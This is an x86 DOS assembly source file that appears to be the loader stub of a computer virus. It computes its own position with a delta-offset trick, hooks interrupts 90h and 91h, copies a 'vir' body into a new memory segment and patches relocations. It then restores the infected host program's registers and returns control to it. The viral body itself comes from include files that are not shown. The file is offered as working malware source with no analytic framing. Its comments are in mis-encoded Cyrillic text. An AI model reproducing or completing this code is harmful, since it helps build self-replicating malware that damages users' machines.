   len_body_in_mem equ 100h+RealBody+1000

   .model tiny
   .code
   org 100h
   start:
         call $+3
   delta:
         cld
         pop  bp
         push cs
         pop  ds
         push 2 ptr cs:[bp+OldSP-delta]
         push 2 ptr cs:[bp+OldSS-delta]
         push 2 ptr cs:[bp+OfsRET-delta]
         push 2 ptr cs:[bp+SegRET-delta]
         mov ax, 3590h
         int 21h
         mov 2 ptr cs:[old90-delta+bp],   bx
         mov 2 ptr cs:[old90+2-delta+bp], es
         mov ax, 3591h
         int 21h
         mov 2 ptr cs:[old91-delta+bp],   bx
         mov 2 ptr cs:[old91+2-delta+bp], es
         mov ax, 2590h
         lea dx, [bp+int_90-delta]
         int 21h
         mov ax, 2591h
         lea dx, [bp+int_91-delta]
         int 21h
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         mov bx, cs
         cmp bx, 8000h
         ja  int_90
         lea ax, [bp+buffer-delta]
         mov cl, 4
         shr ax, cl
         inc ax
         add ax, bx
         mov 2 ptr cs:[bp+bufseg-delta], ax
         mov es, ax
         sub di, di
         lea si, [bp+vir-delta]
         mov cx, body_len
         rep movsb
         sub ax, 10h
         mov es, ax
         mov ds, ax
         ;  áâà ¨¢ ¥¬ reloc's
         add ax, 10h
         mov 2 ptr ds:[relocofs+100h], ax
         mov bx, ax
         add bx, Start_SS
         cli
         mov ss, bx
         mov sp, 0FFFEh
         sti
         push ax
         sub ax, ax
         push ax
         retf
   int_90:
         ; ¢ë§ë¢ ¥âáï ¯à¨ ¢ëå®¤¥
         ; ¯ áª «¥¢áª®© ¯à®£à ¬¬ë
         call $+3
   _delta:
         pop bp
   _exit:
         ; ds=cs; bp=delta
         cli
         push cs
         pop  ss
         mov  sp, 0FFF6h
         sti
         pop 2 ptr cs:[bp+SegRET-_delta]
         pop 2 ptr cs:[bp+OfsRET-_delta]
         pop 2 ptr cs:[bp+OldSS-_delta]
         pop 2 ptr cs:[bp+OldSP-_delta]
         lds dx, 4 ptr cs:[bp+old90-_delta]
         mov ax, 2590h
         int 21h
         lds dx, 4 ptr cs:[bp+old91-_delta]
         mov ax, 2591h
         int 21h
         mov ah, 62h
         int 21h
         mov es, bx
         mov ds, bx
         mov dx, 80h
         mov ah, 1Ah
         int 21h
         add bx, 10h
         add 2 ptr cs:[bp+segRET-_delta], bx
         cli
         db  81h,0C3h
         dw  0
   oldSS equ 2 ptr $-2
         mov ss, bx
         mov sp, 0FFFEh
   oldSP equ 2 ptr $-2
         sub cx, cx
         mul cx     ; ax=dx=cx=0
         sub bx, bx
         sub si, si
         sub di, di
         sub bp, bp
         sti
         db  0EAH
   ofsRET    dw 0
   segRET    dw -10h

   _vir struc
          _buffer dd ?
          source dd ?
          _vl    dw ?
          OfsSS  dd ?
          OfsSP  dd ?
          OfsCS  dd ?
          OfsIP  dd ?
   ends


   int_91:
        call $+3
   $delta:
        pop  bp
        ; ax:si ??
        mov  ax, 2 ptr cs:[bp+bufseg-$delta]
        mov  2 ptr ds:[si._vir._vl], vl
        mov  2 ptr ds:[si._vir._buffer],   len_body_in_mem
        mov  2 ptr ds:[si._vir._buffer+2], ax
        mov  ax, cs
        mov  2 ptr ds:[si._vir.source+2], ax
        mov  2 ptr ds:[si._vir.OfsSS+2],  ax
        mov  2 ptr ds:[si._vir.OfsSP+2],  ax
        mov  2 ptr ds:[si._vir.OfsCS+2],  ax
        mov  2 ptr ds:[si._vir.OfsIP+2],  ax
        ;;;
        lea  ax, [bp+start-$delta]
        mov  2 ptr ds:[si._vir.source],   ax
        lea  ax, [bp+ofsret-$delta]
        mov  2 ptr ds:[si._vir.ofsip],    ax
        lea  ax, [bp+segret-$delta]
        mov  2 ptr ds:[si._vir.ofscs],    ax
        lea  ax, [bp+oldsp-$delta]
        mov  2 ptr ds:[si._vir.ofssp],    ax
        lea  ax, [bp+oldss-$delta]
        mov  2 ptr ds:[si._vir.ofsss],    ax
        iret
   include virstarz.inc
   vir:
   include v.inc
   vl = ($-start)
   bufseg  dw ?
   old90   dd ?
   old91   dd ?
   buffer:
   end start
